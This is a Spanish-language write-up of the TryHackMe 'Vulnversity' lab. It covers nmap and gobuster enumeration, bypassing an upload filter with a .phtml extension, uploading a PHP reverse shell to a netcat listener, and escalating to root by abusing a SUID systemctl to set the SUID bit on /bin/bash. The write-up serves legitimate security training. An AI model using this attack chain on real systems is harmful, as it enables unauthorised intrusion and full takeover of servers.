---
title: Tryhackme - Vulnversity
author: nik0
date: 2020-11-14 14:10:00 +0800
categories: [Write up]
tags: [THM,Vulnversity]
---
![Vulnversity logo!](/assets/img/sample/vulnlogo.png)


## Introducción

En este write up veremos la máquina Vulnversity de Tryhackme, veremos temas cómo reconocimiento activo, ataques a aplicaciones web y escalación de privilegios explotando binarios.

## Reconocimiento

Primero haremos un escaneo con nmap para ello utilizamos el comando ```sudo nmap -sC -sV "ip"``` y el output que nos muestra es el siguiente:

```terminal
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 21:03 -03
Nmap scan report for 10.10.128.154
Host is up (0.27s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m19s, deviation: 2h53m12s, median: 19s
|_nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-11-13T19:04:45-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-14T00:04:46
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.43 seconds
```
Primero probé con el puerto 21, pero no habia ningún exploit para esa versión, luego intenté conectarme para ver si tenía acceso anónimo y nada, después seguí con ssh, y tampoco habían exploits disponibles para esa versión, continué con samba buscando recursos compartidos y estaba todo sin acceso con SMBMAP, luego termino con el puerto 3333 que es http y si pongo la ip de la máquina con el puerto me sale esto:

![1](/assets/img/sample/1.jpeg)

Indagando más a fondo en la página (mirando el codigo fuente etc) me di cuenta de que es solo frontend así que empecé a enumerar directorios con gobuster

## Localizando directorios con Gobuster

Con el comando ```gobuster dir -u http://10.10.128.154:3333 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 150``` enumeramos los directorios escondidos que puede tener la página web, OJO: no es recomendable aumentar los threads porque se podría hacer una denegación de servicio o te podría bloquear un firewall, en todo caso con la herramienta W4fw00f se puede saber si un sitio tiene firewall o no, finalmente este es el resultado de Gobuster:

```terminal
2020/11/13 21:43:55 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/internal (Status: 301)
===============================================================
```
El directorio ```/internal``` se ve interesante y si ponemos esto en la url del sitio nos lleva a esto:

![2](/assets/img/sample/2.png)

Encontramos una subida de archivos, donde podemos subir una shell y así posteriormente tener conexión reversa con el servidor, o un backdoor así que primero vamos a abrir burpsuite para saber que tipo de extension es admitida para poder subir nuestro backdoor

![3](/assets/img/sample/3.png)

ahí subimos el archivo test.jpg y lo interceptamos con burpsuite y ahora lo mandamos a intruder para posteriormente hacer fuzzing al objetivo

![4](/assets/img/sample/4.png)

Luego nos vamos a payloads y cargamos las posibles extensiones que permitirían la subida del archivo, pueden usar la lista que ustedes les guste más

![5](/assets/img/sample/5.png)

Y ejecutamos el ataque, el resultado es el siguiente:

![6](/assets/img/sample/6.png)

Podemos ver que aceptó la extensión .phtml porque cambió la longitud y si se renderiza via web igual se puede ver

Ya que encontramos el directorio donde se pueden subir archivos, tenemos que encontrar en donde se alojan para poder ejecutar nuestro backdoor

Así que utilizamos nuevamente Gobuster para enumerar directorios en el mismo de /internal

El comando a utilizar sería ```gobuster dir -u http://10.10.6.52:3333/internal -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100```

Output:
```terminal
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.6.52:3333/internal
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/13 22:44:15 Starting gobuster
===============================================================
/uploads (Status: 301)
/css (Status: 301)
```
Podemos ver que hay un subdirectorio llamado /uploads y se ve así:

![7](/assets/img/sample/7.png)

Ahora procedemos a subir nuestra shell

## Comprometiendo el servidor web

usamos el comando ```cp /usr/share/webshells/php/php-reverse-shell.php shell.phtml``` para mover nuestra shell y poner la extensión .phtml (OJO: hay que editar la shell y cambiar la ip y el puerto!)

luego la subimos en /internal

ponemos a la escucha netcat con el comando ```nc -lnvp TUPUERTO``` en mi caso era el 443 así que era ```nc -lnvp 443```

lo ejecutamos en /uploads

si todo salió bien, debería aparece algo así en la terminal:

![8](/assets/img/sample/8.png)

ponemos el comando ```uname -a``` para imprimir información sobre el SO

Para mayor comodidad en la terminal se puede hacer una shell TTY interactiva (Buscar en Google)

Ahora que ya estamos dentro, podemos ir escalando privilegios

## Escalando Privilegios

Primero lo que vamos a hacer es usar este comando ```find / -perm -u=s -type f 2>/dev/null``` para buscar desde la raíz el permiso para usuario SUID, porque queremos explotar permisos SUID? porque hay algunos binarios por ej: passwd se ejecuta como root y eso se puede explotar para poder ir escalando privilegios localmente.


Hay una página que se llama GTFOBins, sirve para encontrar binarios Unix que ayuda para hacer una escalada de privilegios, vamos a utilizar esta página para poder comparar los binarios de la máquina actual y los de GTFObins para así poder filtrarlos (Pueden hacer un script o hacerlo manualmente)

Entonces nos da por resultado /bin/systemctl

Ahora que ya sabemos el binario que vamos a explotar, lo buscamos en GTFObins y seguimos las instrucciones:

![GTFO](/assets/img/sample/GTFO.png)

La primera línea ```sudo sh -c 'cp $(which systemctl) .; chmod +s ./systemctl'``` la vamos a ignorar, no la necesitamos por el momento, ahora lo que vamos a hacer es editar la línea de comando ```ExecStart=/bin/sh -c "id > /tmp/output"``` para poder ejecutar /bin/bash, ya que si hacemos un ls -la /bin/bash podemos notar que este se ejecuta cómo root entonces cuando nosotros ejecutemos bash, este se lanzará cómo usuario root, entonces la línea de código sería así:  ```ExecStart=/bin/sh -c "chmod +s /bin/bash"```

Ahora en la consola escribimos bash -p y si salió todo bien, debería aparecer algo así: 

![10](/assets/img/sample/10.png)

Y ahora que ya tenemos root, también podemos sacar el user.txt ;)















